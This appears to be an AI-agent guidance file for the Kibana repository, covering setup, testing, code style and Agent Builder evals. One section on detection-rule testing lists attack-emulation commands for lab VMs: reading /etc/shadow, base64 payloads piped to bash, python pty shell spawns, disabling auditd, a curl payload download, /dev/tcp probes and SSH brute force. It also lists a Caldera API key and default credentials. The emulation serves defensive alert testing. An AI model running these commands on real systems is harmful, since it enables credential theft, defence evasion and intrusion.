# Kibana

## Setup
- Run `yarn kbn bootstrap` for initial setup, after switching branches, or when encountering dependency errors

## Dev Mode (Hot Reload)
- Kibana runs in **dev mode** which automatically restarts after code changes
- When you modify server-side code (TypeScript files in `server/` directories), Kibana will detect changes and restart
- **Important for agents**: After making code changes, **wait for Kibana to fully restart** before testing:
  - Watch the terminal for restart messages (compilation, bundle updates)
  - Wait for "http server running" or similar ready messages
  - Typical restart time: 10-30 seconds depending on the scope of changes
- Do NOT assume execution is broken just because an API call fails immediately after a code change - the server may still be restarting
- If a test fails after code changes, check if Kibana has finished restarting before investigating the failure
- You can monitor the Kibana terminal output to see when the restart is complete

## API Versioning
- Many Kibana APIs use versioned endpoints that require an `elastic-api-version` header
- If you get a 404 response for a valid API path, try adding: `-H "elastic-api-version: 2023-10-31"`
- The version `2023-10-31` is the standard public API version (v1)
- Internal APIs typically use version `1`
- Example curl request with versioning:
  ```bash
  curl -s -X GET "http://localhost:5601/api/security/alert_grouping/workflow" \
    -H "kbn-xsrf: true" \
    -H "elastic-api-version: 2023-10-31" \
    -H "Authorization: Basic $(echo -n 'elastic:changeme' | base64)"
  ```

## Overview
- Kibana is organized into modules, each defined by a `kibana.jsonc`: core, packages, and plugin packages. Aside from tooling and testing, most code lives in these modules.
- Packages are reusable units with explicit boundaries and a single public entry point (no subpath imports), usually with a focused purpose.
- Plugins are a package type (`type: "plugin"`) that include a plugin class with setup/start/stop lifecycles, utilized by the core platform to enable applications.
- Plugins that depend on other plugins rely on the contracts returned by those lifecycles, so circular dependencies must be avoided.
- Module IDs (typically `@kbn/...`) live in `kibana.jsonc`; `package.json` names are derived where present.
- Plugin IDs are additional camelCase IDs under `plugin.id` in `kibana.jsonc`, used by core platform and other plugins.
- Modules are grouped by domain (platform vs solutions) with visibility rules (`shared` vs `private`) that limit cross-group access.
- Utility scripts live in `scripts/` (e.g., `node scripts/generate.js`).

## Critical Thinking
- Fix root cause (not band-aid).
- Unsure: read more code; if still stuck, ask w/ short options.
- Conflicts: call out; pick safer path.
- Unrecognized changes: assume other agent; keep going; focus your changes. If it causes issues, stop + ask user.
- If a user correction contradicts this doc or any skills you followed, or missing guidance caused avoidable work, submit DevEx feedback: `echo "..." | scripts/devex_feedback.sh` (include the gap and suggested fix).

## Testing

### Jest unit
`yarn test:jest [--config=<pathToConfigFile>] [TestPathPattern]`
- Config is auto-discovered from the test file path (walks up to nearest `jest.config.js`). Simplest usage:
  `yarn test:jest src/core/packages/http/server-internal/src/http_server.test.ts`
- Only one `--config` per run. To test multiple packages, run separate commands.

### Jest integration
`yarn test:jest_integration [--config=<pathToConfigFile>] [TestPathPattern]`
- Auto-discovers `jest.integration.config.js` (not `jest.config.js`). Same single-config constraint as above.

### Type check
`yarn test:type_check [--project path/to/tsconfig.json]`
- Without `--project` it checks **all** projects (very slow). Always scope to a single project:
  `yarn test:type_check --project src/core/packages/http/server-internal/tsconfig.json`
- Only one `--project` per run. To check multiple packages, run separate commands.

### Function Test Runner (FTR)
`yarn test:ftr [--config <file1> [--config <file2> ...]]`
- For new tests, prefer using Scout

### Scout (UI/API with Playwright)
`node scripts/scout run-tests --arch stateful --domain classic --config <scoutConfigPath>` (or `--testFiles <specPath1,specPath2>`)

#### Scout Best Practices & Migration Guide
When working with Scout/Playwright tests, **always read and update** the migration guide with any new findings:
- **Osquery guide:** `x-pack/platform/plugins/shared/osquery/test/scout_osquery/SCOUT_MIGRATION_GUIDE.md`

This guide contains critical lessons on: page readiness waits, strict mode violations, EUI ComboBox interactions, CodeMirror/Monaco editor handling, Fleet space awareness, flyout/modal dismissal patterns, pagination handling, role permissions, and more.

**IMPORTANT:** After fixing any non-trivial Scout test issue, immediately document the finding in the relevant `SCOUT_MIGRATION_GUIDE.md`. If a guide doesn't exist for your plugin's Scout tests, create one following the osquery guide structure. This prevents future developers and AI agents from rediscovering the same issues.

## Code Style Guidelines
Follow existing patterns in the target area first; below are common defaults.

### TypeScript & Types
- Use TypeScript for all new code; avoid `any`.
- Prefer explicit return types for public APIs and exported functions.
- Use `import type` for type-only imports.
- Avoid non-null assertions (`!`) unless locally justified.
- Prefer `readonly` and `as const` for immutable structures.
- Prefer const arrow functions
- Prefer explicit import/exports over "*"
- Prefer destructuring of variables, rather than property access

### Formatting
- Follow existing formatting in the file; do not reformat unrelated code.
- Prefer single quotes in TS/JS unless the file uses double quotes.

### Naming
- `PascalCase` for classes, types, and React components.
- `camelCase` for functions, variables, and object keys.
- New filenames must be `snake_case` (lowercase with underscores) unless an existing convention requires otherwise.
- Use descriptive names; avoid single-letter names outside tight loops.

### Control Flow & Error Handling
- Prefer early returns and positive conditions.
- Handle errors explicitly; return typed errors from APIs when possible.
- Keep async logic linear; avoid nested `try` blocks when possible.

### React / UI Conventions
- Use functional components; type props explicitly.
- Keep hooks at the top level; avoid conditional hooks.
- Avoid inline styles unless consistent with the file’s conventions.
- Use `@elastic/eui` components with Emotion (`@emotion/react`) for styling.

## Contribution Hygiene
- Make focused changes; avoid unrelated refactors.
- Update docs when behavior or usage changes.

## Attack Emulation & Alert Generation

This section covers best practices for generating security alerts using GCP VMs with Elastic Defend, Caldera, Cortado, and Atomic Red Team.

### Infrastructure Setup

**VM Provisioning Script**: `scripts/fleet_vms.sh`
- Creates GCP VMs from a golden image with pre-installed tools
- Elastic Agent 9.4.0-SNAPSHOT (cached, auto-enrolls on boot via Tailscale)
- Caldera Sandcat agent (auto-starts on boot)
- Cortado RTAs: `cortado-run-rta`, `cortado-run-rtas`
- Atomic Red Team (`/opt/atomic-red-team`)
- Python 3.12, Tailscale

```bash
# Create 10 VMs
./scripts/fleet_vms.sh create --count 10 --prefix patryk-defend

# Check status (GCP + Fleet enrollment)
./scripts/fleet_vms.sh status

# Destroy when done
./scripts/fleet_vms.sh destroy --prefix patryk-defend-BATCHID --force
```

**Golden Image**: `patryk-elastic-defend` family in `elastic-security-dev` GCP project
- Ubuntu 22.04 with all tools pre-installed
- Agent enrollment happens via startup script (Tailscale VPN -> Fleet Server)
- Typical provisioning: ~25s for VM creation, ~60s for Fleet enrollment

### Caldera (Adversary Emulation)

**Caldera URL**: `http://macbook-pro-patryk.tail9bbcc.ts.net:8888`  
**API Key**: `ADMIN123`

#### Best Adversary Profiles for Alert Generation
| Profile | Abilities | Best For |
|---------|-----------|----------|
| Discovery | 12 | T1082, T1033, T1016, T1057, T1087 |
| Defense Evasion | 36 | T1070, T1562, T1564, T1140, T1027 |
| Ransack | 18 | Recon + Collection + Exfiltration chain |
| Worm | 13 | Lateral movement between hosts |
| OilRig | 44 | Comprehensive APT simulation |
| Super Spy | 15 | User monitoring, file browsing |
| APT29 | 79 | Russian APT full kill chain |
| Sandworm | 40 | Destructive operations |

#### Running Caldera Operations
```bash
CALDERA_URL="http://macbook-pro-patryk.tail9bbcc.ts.net:8888"

# List agents
curl -sk "${CALDERA_URL}/api/v2/agents" -H "KEY:ADMIN123" | jq '.[].host'

# Create an operation
curl -sk -X POST "${CALDERA_URL}/api/v2/operations" \
  -H "KEY:ADMIN123" -H "Content-Type: application/json" \
  -d '{
    "name": "My Operation",
    "adversary": {"adversary_id": "ADVERSARY_ID"},
    "group": "fleet-test",
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "auto_close": true,
    "jitter": "1/3"
  }'

# Check operation status
curl -sk "${CALDERA_URL}/api/v2/operations/OP_ID" -H "KEY:ADMIN123" \
  | jq '{name, state, chains: (.chain | length)}'
```

#### Important Notes
- Caldera agents are in the `fleet-test` group for new VMs
- The `batch` planner (`aaa7c857-...`) runs all abilities on all agents simultaneously
- Set `"jitter": "1/3"` for realistic timing between commands
- `auto_close: true` finishes the operation when all abilities complete
- Some abilities are Windows-only; Linux agents skip those automatically

### Direct SSH Attack Scripts

For maximum alert coverage, use SSH to run attack scripts directly on hosts. This generates endpoint events that Elastic Defend captures independently of Caldera.

**Critical**: When using `gcloud compute ssh --command`, avoid complex quoting with nested single/double quotes. Instead, write the script to a file and use `gcloud compute scp` + `gcloud compute ssh --command="sudo bash /tmp/script.sh"`.

#### High-Impact Linux Techniques for Alert Generation
| MITRE Technique | Commands | Expected Rules Triggered |
|----------------|----------|--------------------------|
| T1003.008 (Shadow file) | `cat /etc/shadow` | Security File Access via Common Utilities |
| T1059.006 (Python) | `python3 -c "import pty; pty.spawn('/bin/sh')"` | Interactive Terminal Spawned via Python, Potential Reverse Shell |
| T1027 (Base64) | `echo "d2hvYW1p" \| base64 -d \| bash` | Base64 Decoded Payload Piped to Interpreter, Multi-Base64 Decoding |
| T1543.002 (Systemd) | Create file in `/etc/systemd/system/` | Systemd Service Created |
| T1053.003 (Cron) | Write to `/etc/cron.d/` | Cron Job Created or Modified |
| T1070.006 (Timestomp) | `touch -t 200001010000 /tmp/file` | Timestomping using Touch Command |
| T1562.001 (Disable tools) | `systemctl stop auditd` | Attempt to Disable Auditd Service |
| T1222.002 (SUID) | `chmod 4755 /tmp/file` | SUID/SGID Bit Set |
| T1564.001 (Hidden files) | `touch /tmp/.hidden_file` | Hidden Files |
| T1105 (Tool Transfer) | `curl -o /tmp/payload http://...` | Ingress Tool Transfer |
| T1033 (User Discovery) | `whoami; id; who; w` | System Owner/User Discovery Linux |
| T1082 (System Info) | `uname -a; hostnamectl` | Linux System Information Discovery |
| T1547.006 (Kernel) | `lsmod; insmod /dev/null` | Kernel Module operations |
| T1548.003 (Sudo) | `echo "" \| sudo -S -l` | Sudo caching |
| Binary from /tmp or /dev/shm | `cp /bin/id /dev/shm/.test; /dev/shm/.test` | Binary Executed from Shared Memory Directory |

#### Lateral Movement Emulation Between Hosts
For multi-host lateral movement alerts, run scripts that:
1. **Remote System Discovery** (T1018): `ping`, `nslookup`, `host` to sister VMs
2. **Network Service Scanning** (T1046): Port probes (`echo >/dev/tcp/HOST/PORT`)
3. **SSH Attempts** (T1021.004): `ssh -o StrictHostKeyChecking=no root@TARGET id`
4. **Lateral Tool Transfer** (T1570): `scp /tmp/payload root@TARGET:/tmp/`
5. **Remote Service Exploitation** (T1210): HTTP probes to common services
6. **Brute Force** (T1110): Multiple SSH login attempts with different credentials

**Important**: Use `timeout` with all SSH/network commands to prevent hangs. Avoid `python3 -c "import pty; pty.spawn(..."` in SSH commands without `< /dev/null` as it blocks the session.

### Enabling Prebuilt Detection Rules

```bash
# Enable all rules by MITRE tactic (batch approach, avoids 1000-rule API limit)
for tactic in "Lateral Movement" "Credential Access" "Discovery" "Execution" \
  "Defense Evasion" "Persistence" "Privilege Escalation" "Command and Control" \
  "Collection" "Exfiltration" "Impact" "Initial Access"; do
  curl -s -X POST "http://localhost:5601/api/detection_engine/rules/_bulk_action" \
    -H "kbn-xsrf: true" -H "elastic-api-version: 2023-10-31" \
    -H "Content-Type: application/json" -u elastic:changeme \
    -d "{\"query\": \"alert.attributes.tags:\\\"Tactic: ${tactic}\\\" AND NOT alert.attributes.enabled: true\", \"action\": \"enable\"}"
done

# Check enabled count
curl -s "http://localhost:5601/api/detection_engine/rules/_find?per_page=1&filter=alert.attributes.enabled:true" \
  -H "kbn-xsrf: true" -H "elastic-api-version: 2023-10-31" -u elastic:changeme \
  | jq '.total'
```

**Trick to trigger immediate rule evaluation**: Disable then re-enable rules. This forces them to re-evaluate against events already in the index instead of waiting for the next scheduled run.

**Warning**: The bulk action API has a 1000-rule limit per request. Use tactic-based queries (as shown above) to enable rules in smaller batches.

### Monitoring Alert Generation

```bash
# Total alerts per host (last 24h)
curl -s -X POST "http://localhost:9200/.alerts-security.alerts-*/_search" \
  -H "Content-Type: application/json" -u elastic:changeme \
  -d '{
    "size": 0,
    "query": {"bool": {"filter": [{"range": {"@timestamp": {"gte": "now-24h"}}}]}},
    "aggs": {"by_host": {"terms": {"field": "host.name", "size": 50}}}
  }' | jq '{total: .hits.total.value, hosts: [.aggregations.by_host.buckets[] | {host: .key, count: .doc_count}]}'

# Alerts by rule name
curl -s -X POST "http://localhost:9200/.alerts-security.alerts-*/_search" \
  -H "Content-Type: application/json" -u elastic:changeme \
  -d '{
    "size": 0,
    "query": {"bool": {"filter": [{"range": {"@timestamp": {"gte": "now-24h"}}}]}},
    "aggs": {"by_rule": {"terms": {"field": "kibana.alert.rule.name", "size": 30}}}
  }' | jq '[.aggregations.by_rule.buckets[] | {rule: .key, count: .doc_count}]'

# Lateral movement alerts specifically
curl -s -X POST "http://localhost:9200/.alerts-security.alerts-*/_search" \
  -H "Content-Type: application/json" -u elastic:changeme \
  -d '{
    "size": 0,
    "query": {"bool": {"filter": [
      {"range": {"@timestamp": {"gte": "now-24h"}}},
      {"terms": {"kibana.alert.rule.threat.tactic.name": ["Lateral Movement"]}}
    ]}},
    "aggs": {"by_host": {"terms": {"field": "host.name", "size": 20}}}
  }' | jq '.hits.total.value'
```

### Expected Results (10 VMs, full attack emulation)
- **Total alerts**: 1500-2000+ within 1-2 hours
- **Per host**: 100-200+ alerts
- **Rule diversity**: 30+ unique rule names triggered
- **Key rules**: Potential Reverse Shell Activity, Multi-Base64 Decoding, System Owner/User Discovery, Base64 Decoded Payload, System Network Connections Discovery, Binary Executed from Shared Memory, Cron Job Created, Timestomping, SUID/SGID Bit Set
- **Lateral movement**: 20-30 alerts across hosts (Remote File Creation, Unusual Remote File Creation, SSH Authorized Keys)
- **Tactics covered**: Discovery, Execution, Persistence, Defense Evasion, Credential Access, Lateral Movement, Collection, Privilege Escalation, Command and Control, Impact

### Troubleshooting
- **No Caldera agents showing up**: Check if Sandcat is running (`systemctl status sandcat`), verify Tailscale connectivity
- **Few alerts generated**: Most rules have 5-minute intervals; wait or cycle rules (disable then re-enable)
- **SSH commands hanging**: Use `timeout` wrapper, avoid interactive commands like `python3 pty.spawn()` without input redirection
- **VM not enrolling in Fleet**: Check startup script logs via `gcloud compute instances get-serial-port-output VM_NAME`
- **Alerts not appearing in Kibana**: Check `.alerts-security.alerts-*` index directly via Elasticsearch, verify rules are enabled and not in error state

<!-- OPENSPEC:START -->
# OpenSpec Instructions

These instructions are for AI assistants working in this project.

Always open `@/openspec/AGENTS.md` when the request:
- Mentions planning or proposals (words like proposal, spec, change, plan)
- Introduces new capabilities, breaking changes, architecture shifts, or big performance/security work
- Sounds ambiguous and you need the authoritative spec before coding

Use `@/openspec/AGENTS.md` to learn:
- How to create and apply change proposals
- Spec format and conventions
- Project structure and guidelines

Keep this managed block so 'openspec update' can refresh the instructions.

<!-- OPENSPEC:END -->

## Personal Kibana Ideas Knowledge Base (private-by-default)

When the user asks about a **new Kibana feature idea / improvement idea**, treat it as a **private note** unless the user explicitly asks to publish/share it.

### Storage location (shared across worktrees)

- Default private KB directory: `/Users/patrykkopycinski/Projects/kibana.worktrees/.kibana_private_ideas`
- Override via env: `KIBANA_PRIVATE_IDEAS_DIR`

**Never commit** idea content into this repo. The `.gitignore` contains protections, but still verify you only write under the private KB directory.

### How to capture an idea

For each new idea, create a new markdown file under `ideas/` with:
- A short unique **ID** (timestamp + kebab title is fine)
- **Frontmatter**: `title`, `status`, `area`, `tags`, `created`, `updated`
- Sections: **Why**, **What**, **Benefits / Impact**, **Connections**, **Open questions**, **Next action**, **Progress log**
- **Connections** MUST include:
  - Related idea IDs/files (backlinks when applicable)
  - Tags that help retrieval
  - A sentence on how it **correlates/benefits/improves** other ideas (even if tentative)

Also update the private KB `index.md` table with the new idea entry.

### Helper script (preferred)

Use `scripts/ai/capture_kibana_idea.mjs` to create the note and update the index.

## Agent Builder Skills + Tooling Guidelines (for future changes)

### CRITICAL: Adding New Skills to Allow List

**When creating a new skill, you MUST add it to the allow list or it will fail at runtime!**

File: `@kbn/agent-builder-server/allow_lists.ts`

Add the skill namespace to `AGENT_BUILDER_BUILTIN_SKILLS` array:
```typescript
export const AGENT_BUILDER_BUILTIN_SKILLS: string[] = [
  // ... existing skills ...
  'your.new_skill_namespace',  // <-- Add your skill here
];
```

**Checklist for new skills:**
1. Create the skill file with `namespace`, `name`, `description`, `content`, and `tools`
2. Export from the skills index file
3. Register in plugin.ts (or register_skills.ts)
4. **ADD TO ALLOW LIST** in `allow_lists.ts` ← Don't forget this!
5. Add/update evals for the skill

### Skill vs tool naming
- **Skills** are registered with a `namespace` (skill id) and are surfaced to the model as files under `/skills/...`.
- **Skill-tools** are the LangChain tools attached to a skill (`skill.tools`) and are invoked via `invoke_skill`.
- **Underlying Agent Builder tools** may or may not be attached to the current agent; skill-tools can proxy/route to them.

### Default: one tool per skill (router via `operation`)
Prefer **one skill-tool per skill** that routes via a discriminated union on `operation` when:
- Operations are closely related and share context/guardrails.
- You want one obvious entrypoint to reduce tool-selection errors.
- You can keep each operation schema small and explicit.

### When to split into multiple tools
Prefer **multiple tools** (one per operation or per cluster of operations) when:
- The schemas are highly divergent/large/nested and the union becomes hard for the model.
- You need stronger separation between **read-only** and **write** actions.
- You want clearer tool selection and simpler per-tool examples.

### Write safety: require explicit confirmation
For any operation that mutates state:
- Require `confirm: true` (and optionally `confirmReason`) in the schema.
- Enforce it in the handler/router (don’t rely only on skill markdown).

### Schema robustness (LLM-tolerant)
Tool schemas should accept common LLM variations and normalize internally:
- Accept both `{ operation, params: { ... } }` and flattened `{ operation, ... }` where appropriate.
- For commonly confused fields (e.g. comment shapes), accept both shapes and normalize.

### Error handling: return operation-specific schema
When a tool call fails validation:
- Return the **schema for the specific operation branch** (not the full union).
- Keep the payload compact (truncate if needed) to avoid context overflow.
- Include a minimal `expected_params_example` to make self-correction deterministic.

### MANDATORY: Update Evals When Changing Skills

**Every skill change MUST be accompanied by corresponding eval updates.** This ensures the skill behavior is tested and regressions are caught.

When modifying a skill:

1. **Identify existing evals** for the skill:
   ```bash
   # Find evals that test the skill
   rg "skill_name" x-pack/platform/packages/shared/agent-builder/kbn-evals-suite-agent-builder/evals/
   ```

2. **Update existing evals** if behavior changed:
   - If a tool now returns additional fields (e.g., `errors`, `aggregations`), update expected outputs
   - If error handling improved, add test cases for error scenarios
   - If new parameters were added, add test cases covering them

3. **Add new evals** for new functionality:
   - Create test cases that exercise the new behavior
   - Include both success and failure scenarios
   - Test edge cases (empty results, errors, validation failures)

4. **Example: Adding error handling to a results skill**
   ```typescript
   // Before: Only tested successful results
   // After: Also test error scenarios
   {
     name: 'handles query errors gracefully',
     input: 'Run query with invalid column on agent X',
     expectedOutput: 'The agent should detect the query failed, report the error message (e.g., "no such column"), and suggest using get_schema to verify column names',
     evaluators: ['ToolUsageOnly', 'Factuality'],
   }
   ```

5. **Run evals locally** before submitting:
   ```bash
   node scripts/evals.js --config x-pack/platform/packages/shared/agent-builder/kbn-evals-suite-agent-builder/evals/<skill_name>/<skill_name>.spec.ts
   ```

**Do NOT skip this step.** Untested skill changes lead to regressions and unreliable agent behavior.

## Agent Builder Evaluation Best Practices

### Test Data Generation
Tests should **NOT rely on production data** that may or may not exist. Instead:

1. **Create dedicated test indices** with known sample data in `beforeAll`:
   ```typescript
   const TEST_INDEX = 'logs-eval-test';
   const SAMPLE_LOGS = [/* sample data */];
   
   evaluate.beforeAll(async ({ esClient, log }) => {
     // Create index with proper mappings
     await esClient.indices.create({ index: TEST_INDEX, ... });
     // Index sample documents
     await esClient.bulk({ refresh: true, operations: [...] });
   });
   ```

2. **Clean up test data** in `afterAll` to avoid test pollution:
   ```typescript
   evaluate.afterAll(async ({ esClient, log }) => {
     await esClient.indices.delete({ index: TEST_INDEX });
   });
   ```

3. **Use specific test index names** in queries (e.g., `logs-eval-test` not `logs-*`)

4. **Expected outputs should reference the known data**:
   - Be specific about what the agent should find
   - Include expected counts, field values, and data characteristics
   - Example: "Expected to find 3 error logs about: connection timeout, authentication failure, and disk space critical"

### Expected Output Format
Write expected outputs that **describe what a correct response should contain**:

- **DO**: "The agent should search X index and find Y entries showing Z fields"
- **DO**: "Expected to find N items about: [specific items from test data]"
- **DON'T**: "Response should search and present results or state no data found" (too vague)
- **DON'T**: "The response should be relevant" (not actionable)

### Evaluator Selection
Only include evaluators relevant to the test:
- **ToolUsageOnly**: When testing tool routing/selection
- **Factuality**: When testing factual accuracy against known data
- **Relevance**: When testing response relevance to questions
- **Groundedness**: When testing if claims are supported by tool results

Remove irrelevant evaluators from the default set to avoid false negatives.

### Concurrency
Use `concurrency: 3` (or `DEFAULT_CONCURRENCY`) for faster test execution without impacting result quality.

### Skill Instructions
Skills should provide **explicit response format guidelines**:
- Clear examples for different scenarios (results found, no results, errors)
- List of things to NEVER include (explanations, apologies, stack traces)
- Concrete examples that match the test scenarios